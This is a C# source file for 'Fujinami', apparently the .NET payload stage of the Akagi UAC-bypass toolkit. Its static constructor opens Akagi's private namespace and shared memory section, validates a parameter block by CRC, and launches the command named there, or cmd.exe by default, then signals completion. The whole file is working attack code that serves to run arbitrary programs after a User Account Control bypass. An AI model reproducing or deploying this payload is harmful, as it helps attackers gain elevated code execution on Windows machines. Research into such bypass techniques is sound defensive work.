/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2018
*
*  TITLE:       ENTRYPOINT.CS
*
*  VERSION:     3.11
*
*  DATE:        23 Nov 2018
*
*  Fujinami entrypoint.
* 
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

//
// Fujinami payload code
//
// Read shared parameters block, use custom parameter value and execute it.
//
namespace Fujinami
{
    public class EntryPoint
    {
        /// <summary>
        /// Program entry point.
        /// </summary>
        static EntryPoint()
        {
            try
            {
                //
                // Create boundary descriptor.
                //
                bool bSharedParamsReadOk = false;
                IntPtr BoundaryDescriptor = NativeMethods.CreateBoundaryDescriptorW("ArisuTsuberuku", 0);
                if (BoundaryDescriptor == IntPtr.Zero)
                    return;

                IntPtr domainSid = IntPtr.Zero;
                IntPtr pSid = IntPtr.Zero;
                uint cbSid = 0;

                NativeMethods.CreateWellKnownSid(WELL_KNOWN_SID_TYPE.WinWorldSid, domainSid, pSid, ref cbSid);

                pSid = Marshal.AllocHGlobal(Convert.ToInt32(cbSid));

                if (!NativeMethods.CreateWellKnownSid(
                        WELL_KNOWN_SID_TYPE.WinWorldSid,
                        domainSid,
                        pSid,
                        ref cbSid))
                {
                    Marshal.FreeHGlobal(pSid);
                    return;
                }

                if (!NativeMethods.AddSIDToBoundaryDescriptor(ref BoundaryDescriptor, pSid))
                {
                    Marshal.FreeHGlobal(pSid);
                    return;
                }

                Marshal.FreeHGlobal(pSid);
                NativeMethods.DeleteBoundaryDescriptor(BoundaryDescriptor);

                //
                // Open Akagi namespace.
                //
                IntPtr hPrivateNamespace = NativeMethods.OpenPrivateNamespaceW(BoundaryDescriptor, "AkagiIsoSpace");
                if (hPrivateNamespace == IntPtr.Zero)
                    return;

                IntPtr hSection = IntPtr.Zero;

                OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES(
                    "AkagiSharedSection",
                    ObjectFlags.CaseInsensitive,
                    hPrivateNamespace);

                //
                // Read shared parameters block.
                //
                NtStatus Status = NativeMethods.NtOpenSection(
                    out hSection,
                    SectionAccess.MapRead,
                    ref oa);

                if (NativeMethods.IsSuccess(Status))
                {
                    IntPtr BaseAddress = IntPtr.Zero;
                    IntPtr ViewSize = new IntPtr(0x1000);
                    long sectionOffset = 0;

                    Status = NativeMethods.NtMapViewOfSection(
                        hSection,
                        NativeMethods.GetCurrentProcess(),
                        ref BaseAddress,
                        IntPtr.Zero,
                        new IntPtr(0x1000),
                        ref sectionOffset,
                        ref ViewSize,
                        SectionInherit.ViewUnmap,
                        MemoryFlags.TopDown,
                        MemoryProtection.ReadOnly);

                    if (NativeMethods.IsSuccess(Status))
                    {
                        int StructSize = Marshal.SizeOf(typeof(SHARED_PARAMS));
                        byte[] rawData = new byte[StructSize];
                        Marshal.Copy(BaseAddress, rawData, 0, StructSize);

                        SHARED_PARAMS SharedParams = (SHARED_PARAMS)
                            Marshal.PtrToStructure(
                                Marshal.UnsafeAddrOfPinnedArrayElement(rawData, 0),
                                typeof(SHARED_PARAMS));

                        NativeMethods.NtUnmapViewOfSection(hSection, BaseAddress);

                        //
                        // Validate data.
                        //
                        var Crc32 = SharedParams.Crc32;
                        SharedParams.Crc32 = 0;

                        var StructPtr = Marshal.AllocHGlobal(StructSize);

                        Marshal.StructureToPtr(SharedParams, StructPtr, false);

                        bSharedParamsReadOk = (Crc32 == NativeMethods.RtlComputeCrc32(0, StructPtr, Convert.ToUInt32(StructSize)));

                        Marshal.FreeHGlobal(StructPtr);

                        //
                        // Run custom parameter.
                        //
                        var PayloadToExecute = string.Empty;

                        if (bSharedParamsReadOk)
                        {
                            PayloadToExecute = SharedParams.szParameter;
                        }

                        //
                        // If no parameter present - select default.
                        //
                        if (PayloadToExecute == string.Empty)
                            PayloadToExecute = Environment.ExpandEnvironmentVariables("%ComSpec%");

                        Process.Start(PayloadToExecute);

                        //
                        // Notify Akagi about completion.
                        //
                        if (bSharedParamsReadOk)
                        {
                            IntPtr hEvent = IntPtr.Zero;

                            OBJECT_ATTRIBUTES oae = new OBJECT_ATTRIBUTES(
                                SharedParams.szSignalObject,
                                ObjectFlags.CaseInsensitive,
                                hPrivateNamespace);

                            Status = NativeMethods.NtOpenEvent(out hEvent, EventAccess.AllAccess, ref oae);
                            if (NativeMethods.IsSuccess(Status))
                            {
                                int prev = 0;
                                NativeMethods.NtSetEvent(hEvent, out prev);
                                NativeMethods.NtClose(hEvent);
                            }
                        }
                    }
                    NativeMethods.NtClose(hSection);
                }
                NativeMethods.ClosePrivateNamespace(hPrivateNamespace, 0);
            }
            catch
            {
                Environment.Exit(0);
            }

            Environment.Exit(0);
        }
    }
}
